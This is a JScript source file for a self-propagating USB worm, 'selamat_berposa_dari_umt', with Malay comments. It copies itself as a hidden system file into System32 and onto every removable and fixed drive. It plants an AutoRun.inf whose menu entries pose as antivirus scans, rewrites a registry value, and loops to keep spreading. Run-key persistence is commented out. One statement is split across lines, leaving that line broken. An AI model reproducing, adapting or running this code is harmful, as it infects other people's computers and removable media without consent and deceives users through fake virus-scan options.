// selamat_berposa_dari_umt
// Constant
var ThisFileName = "\\selamat_berposa_dari_umt.js";
var AutorunFileName = "\\AutoRun.inf";
var CRLF = "\r\n";
var RemovableDrive = 1;
var FixedDrive = 2;
var DelayStart = 10000;
var DelayProcess = 1000;
var DelayFixedDrive = 60000;

// Global Variable
var ThisText,AutorunText,tf,RegPath;

AutorunText = "[autorun]" + CRLF;
AutorunText = AutorunText + "Open = wscript.exe " + ThisFileName + CRLF;
AutorunText = AutorunText + "shellexecute = wscript.exe " + ThisFileName + CRLF;
AutorunText = AutorunText + "shell\\Open\\command = wscript.exe " + ThisFileName + CRLF;
AutorunText = AutorunText + "shell\\Explore\\command = wscript.exe " + ThisFileName + " -Clicked" + CRLF;
AutorunText = AutorunText + "shell\\AutoPlay\\command = wscript.exe " + ThisFileName + CRLF;
AutorunText = AutorunText + "shell\\Scan for Viruses\\command = wscript.exe " + ThisFileName + CRLF;
AutorunText = AutorunText + "shell\\Scan with Norton AntiVirus\\command = wscript.exe " + ThisFileName + CRLF;
AutorunText = AutorunText + "shell\\Scan with AVG\\command = wscript.exe " + ThisFileName + CRLF;
AutorunText = AutorunText + "shell = Explore";

var fs = new ActiveXObject("Scripting.FileSystemObject");
var ThisPath = fs.GetFile(WScript.ScriptFullname);
var check = ThisPath.Drive.DriveType;

var WinPath = new String(fs.GetSpecialFolder(0)); // Windows Folder
var SysPath = new String(fs.GetSpecialFolder(1)); // System32 Folder
var aShell = new ActiveXObject("WScript.Shell");

// Open the explorer if double clicked
var aArgs = WScript.Arguments;
for (var i = 0; i < aArgs.length; i++)
{
    if(aArgs(i) == "-Clicked")
    {
        aShell.Run(WinPath + "\\explorer.exe " + WScript.ScriptFullname.substr(0,3)); 
    }
}

WScript.Sleep(DelayStart);

// copy diri sendiri save kat win dir
var text;
try
{
    text = ThisPath.OpenAsTextStream(1,-2); //1 - open for read, -2 using syetem default encoding
    ThisText = "";
    while (!text.AtendOfStream) // copy this file to the ThisText
    {
        ThisText = ThisText + text.ReadLine();
        ThisText = ThisText + "\n";
    }
} catch(e){}

do
{
    try
    {
        if (fs.FileExists(SysPath + ThisFileName))
        {
            tf = fs.GetFile(SysPath + ThisFileName);
            tf.Attributes = 32; // Archive
        }
        tf = fs.CreateTextFile(SysPath + ThisFileName, 2, true); // overite n unicode
        tf.Write(ThisText);
        tf.Close();
        tf = fs.GetFile(SysPath + ThisFileName);
        tf.Attributes = 39; // Archive, ReadOnly, Hidden, System
    } catch(e){}

    var DrivesEnum = new Enumerator(fs.Drives);
    var aDrive;
    for (; !DrivesEnum.atEnd(); DrivesEnum.moveNext())
    {
        aDrive = DrivesEnum.item();
        if ((aDrive.DriveType == RemovableDrive || aDrive.DriveType == FixedDrive) && aDrive.Path != "A:")  // 1 - Removable, 2 - Fixed
        {
            // copy diri sendiri save kat flash drive
            try
            {
                if (fs.FileExists(aDrive.Path + ThisFileName))
                {
                    tf = fs.GetFile(aDrive.Path + ThisFileName);
                    tf.Attributes = 32;        
                }
                tf = fs.CreateTextFile(aDrive.Path + ThisFileName, 2, true);
                tf.Write(ThisText);
                tf.Close();
                tf = fs.GetFile(aDrive.Path + ThisFileName);
                tf.Attributes = 39;
            } catch(e){}
            
            // copy autorun.inf save kat flash drive
            try
            {
                if (fs.FileExists(aDrive.Path + AutorunFileName))
                {
                    tf = fs.GetFile(aDrive.Path + AutorunFileName);
                    tf.Attributes = 32;
                }
                tf = fs.CreateTextFile(aDrive.Path + AutorunFileName, 2, true);
                tf.Write(AutorunText);
                tf.Close();
                tf = fs.GetFile(aDrive.Path + AutorunFileName);
                tf.Attributes = 39;
            } catch(e){}
        }
    }

    // set registry
    try
    {
        WScript.Sleep(DelayProcess);
        //RegPath = "HKEY_LOCAL_MACHINE";
        //RegPath = RegPath + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        //RegPath = RegPath + "\\ selamat_berposa_dari_umt ";
        //aShell.RegWrite(RegPath, "wscript.exe " + SysPath + ThisFileName, "REG_SZ");
        //RegPath = "HKEY_CURRENT_USER";
        //RegPath = RegPath + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
        //RegPath = RegPath + "\\ShowSuperHidden";
        //aShell.RegWrite(RegPath, 0, "REG_DWORD");
        RegPath = "HKEY_CURRENT_USER";
        Reg
Path = RegPath + "\\Software\\Microsoft\\Internet Explorer\\Main";
        RegPath = RegPath + "\\Window Title";
        aShell.RegWrite(RegPath, " selamat_berposa_dari_umt ", "REG_SZ");
    } catch(e){}

    // wait 1 min for fixed drv
    if (check != RemovableDrive)
        WScript.Sleep(DelayFixedDrive);

} while(check != RemovableDrive && WScript.ScriptFullname.substr(0,3).toLowerCase() == SysPath.substr(0,3).toLowerCase())

// Run system Haha before this Haha closed
if (check == RemovableDrive)
    aShell.Run("wscript.exe " + SysPath + ThisFileName);
